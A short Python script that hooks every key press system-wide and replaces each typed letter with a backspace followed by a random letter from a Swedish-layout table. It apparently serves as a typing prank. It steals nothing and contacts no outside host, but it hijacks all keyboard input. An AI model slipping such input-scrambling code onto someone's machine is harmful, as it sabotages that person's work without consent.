import random
import keyboard

swedish_keyboard = {
    "a": "q",
    "b": "w",
    "c": "e",
    "d": "r",
    "e": "t",
    "f": "y",
    "g": "u",
    "h": "i",
    "i": "o",
    "j": "p",
    "k": "å",
    "l": "a",
    "m": "s",
    "n": "d",
    "o": "f",
    "p": "g",
    "q": "h",
    "r": "j",
    "s": "k",
    "t": "l",
    "u": "ö",
    "v": "ä",
    "w": "z",
    "x": "x",
    "y": "c",
    "z": "v",
    "å": "b",
    "ä": "n",
    "ö": "m",
}

def on_key_press(event):
    if event.name in swedish_keyboard:
        random_key = random.choice(list(swedish_keyboard.values()))
        keyboard.press_and_release('backspace')
        keyboard.press_and_release(random_key)

keyboard.on_press(on_key_press)

# This will keep the program running until you manually exit it
keyboard.wait()